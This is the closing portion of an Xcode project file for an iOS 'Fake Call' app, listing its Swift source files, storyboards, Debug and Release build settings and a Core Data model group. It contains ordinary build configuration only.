				046D83292BDCD355004A846D /* TimerVC.swift in Sources */,
				04C9EDDB2BE1169F00742982 /* NotificationVC.swift in Sources */,
				04C42C312BBD177300130100 /* Extension.swift in Sources */,
				04C9EDD92BE1168200742982 /* OfferVC.swift in Sources */,
				044AFD732BC3C37A00D43187 /* WallpaperVC.swift in Sources */,
				042653592BEA2C22000A332E /* VibrationManager.swift in Sources */,
				0451392B2BD7812600E88DE3 /* DuringCallThemeVC.swift in Sources */,
				041570012BD65D9400BB3A76 /* RingtoneVC.swift in Sources */,
				04C42C3D2BBD61D200130100 /* OnBoadingVC.swift in Sources */,
				046D83262BDCB6F0004A846D /* MTSlideToOpenView.swift in Sources */,
				0411AA7A2BE8CF2300E977EE /* AFWrepper.swift in Sources */,
				044AFD772BC3D4B600D43187 /* ChooseWallpaperVC.swift in Sources */,
				04D4CDF92BC798ED00A22ED7 /* CallThemeVC.swift in Sources */,
				0458D6002BCCF5580009FE3E /* Core Data.swift in Sources */,
				0480C3C02BE26046009BB9F7 /* FirstPremiumSubscriptionVC.swift in Sources */,
				0446BC132BCFA62C006F9487 /* ContactGellaryVC.swift in Sources */,
				046D83242BDCB3D1004A846D /* ThemeTwoVC.swift in Sources */,
				04FCA5942BE36733005255E7 /* SecondSubscriptionVC.swift in Sources */,
				04C42C232BBD0F8D00130100 /* Fake_Call.xcdatamodeld in Sources */,
				040894CA2BBE771F00B343F1 /* ContactDetailsVC.swift in Sources */,
				04C42C1D2BBD0F8D00130100 /* HomeVC.swift in Sources */,
				04683DC92BC109F900CAA1BA /* CallerIdVC.swift in Sources */,
				048C42A02BDF63EA00EEDAEB /* Modal.swift in Sources */,
				04C42C362BBD1CF300130100 /* Utils.swift in Sources */,
				04C42C192BBD0F8D00130100 /* AppDelegate.swift in Sources */,
				04E7D4572BC5055200A99F75 /* RecodingVoiceVC.swift in Sources */,
				049466662BBED36C00A5F432 /* VoiceVC.swift in Sources */,
				04F6F5E72C0987A900BEC2CC /* popPremiumVc.swift in Sources */,
				04116FE32BEA0E2F004CBB41 /* Torch.swift in Sources */,
				04C9EDD72BE1165400742982 /* FeedBackVC.swift in Sources */,
				048C8E992BE389C900942E1C /* primiumVC.swift in Sources */,
				04E82ACA2BCFEBF500D7B8E4 /* TextEditVC.swift in Sources */,
				0429328B2BFDA81F00209726 /* AdMob.swift in Sources */,
				04C42C1B2BBD0F8D00130100 /* SceneDelegate.swift in Sources */,
				04C42C352BBD1CF300130100 /* Constants.swift in Sources */,
				04C42C402BBD69B200130100 /* Setting VC.swift in Sources */,
				04C42C392BBD1F5A00130100 /* Created URL.swift in Sources */,
				045139292BD7722C00E88DE3 /* ThemeOneVC.swift in Sources */,
				0492EB712BE514D600543FF9 /* TheameThreeVC.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		04C42C1E2BBD0F8D00130100 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				04C42C1F2BBD0F8D00130100 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		04C42C262BBD0F8E00130100 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				04C42C272BBD0F8E00130100 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		04C42C2A2BBD0F8E00130100 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		04C42C2B2BBD0F8E00130100 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		04C42C2D2BBD0F8E00130100 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 5CFABEAE2DEBF17A792AB99C /* Pods-Fake Call.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = V6VDQDMFG7;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Fake Call/Info.plist";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "\"This app requires access to your device's microphone to enable voice recording and audio input for [specific app features or functionality].";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen.storyboard;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UIStatusBarHidden = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = UIInterfaceOrientationPortrait;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "Liger-Infotech.Fake-Calll";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		04C42C2E2BBD0F8E00130100 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = DBA6E61445126F6DB615477A /* Pods-Fake Call.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = V6VDQDMFG7;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Fake Call/Info.plist";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "\"This app requires access to your device's microphone to enable voice recording and audio input for [specific app features or functionality].";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen.storyboard;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UIStatusBarHidden = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = UIInterfaceOrientationPortrait;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "Liger-Infotech.Fake-Calll";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		04C42C102BBD0F8D00130100 /* Build configuration list for PBXProject "Fake Call" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04C42C2A2BBD0F8E00130100 /* Debug */,
				04C42C2B2BBD0F8E00130100 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		04C42C2C2BBD0F8E00130100 /* Build configuration list for PBXNativeTarget "Fake Call" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04C42C2D2BBD0F8E00130100 /* Debug */,
				04C42C2E2BBD0F8E00130100 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCVersionGroup section */
		04C42C212BBD0F8D00130100 /* Fake_Call.xcdatamodeld */ = {
			isa = XCVersionGroup;
			children = (
				04C42C222BBD0F8D00130100 /* Fake_Call.xcdatamodel */,
			);
			currentVersion = 04C42C222BBD0F8D00130100 /* Fake_Call.xcdatamodel */;
			path = Fake_Call.xcdatamodeld;
			sourceTree = "<group>";
			versionGroupType = wrapper.xcdatamodel;
		};
/* End XCVersionGroup section */
	};
	rootObject = 04C42C0D2BBD0F8D00130100 /* Project object */;
}
